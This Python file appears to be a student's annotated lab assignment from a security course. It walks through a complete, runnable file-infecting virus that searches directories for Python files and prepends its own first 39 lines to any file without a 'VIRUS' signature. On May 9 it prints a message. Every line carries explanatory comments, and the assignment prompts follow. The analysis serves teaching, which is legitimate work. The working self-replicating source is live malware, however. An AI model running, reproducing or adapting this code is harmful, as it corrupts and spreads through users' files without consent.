#!/usr/bin/python3

# Script Name:                  DoNotrun python danger
# Author:                       Raphael Chookagian
# Date of latest revision:      06/16/2023
# Purpose:                      # Perform an analysis of the Python-based code.

# - Insert comments into each line of the script explaining in your own words what the virus is doing on this line.

# - Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.

# - Insert comments above the final three lines explaining how the functions are called and what this script appears to do.


# ------------------------------------------------------------------------

# imports os so we can use python commands
import os
# imports date and time module to use
import datetime

# setting veriable SIGNATURE setting it to equal or "be" a replacement for VIRUS
SIGNATURE = "VIRUS"

# creating a function that takes in a path
def locate(path):
    # sets files_targeted to an empty array/list
    files_targeted = []
    # sets variable filelist to equal os.listdir(path), this will run the os command to list the directory for the given path.
    filelist = os.listdir(path)
    # for each instance of fname in filelist do this:
    for fname in filelist:
        # Checking through each available directorys and subdirectories
        # Checking for any python file (ending in .py)
        # In each python file it checks for the "SIGNATURE" variable
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
        # If the "SIGNATURE" is already in the file, it exits and moves on.
                if SIGNATURE in line:
                    infected = True
                    break
        # If the "SIGNATURE" is not found, it is added to the files_targeted list.
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# creates a functions that takes in the files_targeted list
def infect(files_targeted):
    # sets the virus variable to the current file (absolute path from abspath)
    # opens file
    virus = open(os.path.abspath(__file__))
    # set variable virusstring to empty string to start/initialize
    virusstring = ""
    # iterates through and up to the 39th line of code in the file
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    # read and write modes to append file
    for fname in files_targeted:
        # open the file(fname)
        f = open(fname)
        # set variable temp to f.read()
        temp = f.read()
        # close the file
        f.close()
        # open file in write mode
        f = open(fname,"w")
        # write the virus string and temp(which is f.read())
        f.write(virusstring + temp)
        # close the file
        f.close()

# create function detonate
def detonate():
    # if it matches the set date and time then do the thing
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # display message
        print("You have been hacked")

# set variable files_targeted to be locate(os.path.abspath(""))
# use locate function and absolute path to get file path
files_targeted = locate(os.path.abspath(""))
# calls infect function with file_targeted as argument
infect(files_targeted)
# calls detonate function
detonate()

# This script checks every directory and their subdirectories for python files, if there are none, they move on to the next file/directory. If there are, they read up to the 39th line of code, then injects is own code "signature" and moves on to the next file/directory on the list. If the date and time match the detonate functin, the message is displayed.
```

# Perform an analysis of the Python-based code.

# - Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
# - Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
# - Insert comments above the final three lines explaining how the functions are called and what this script appears to do.

# ## Stretch Goals (Optional Objectives)

# Pursue stretch goals if you are a more advanced user or have remaining lab time.

# In your submission, include comments towards the bottom explaining the below:

# - Identify all the core Python/coding tools used by this script, e.g. functions.
# - What kind of malware is this? Define this type of malware in your own words.
# - How well is this code written? Would you have done something differently to achieve the same objective?

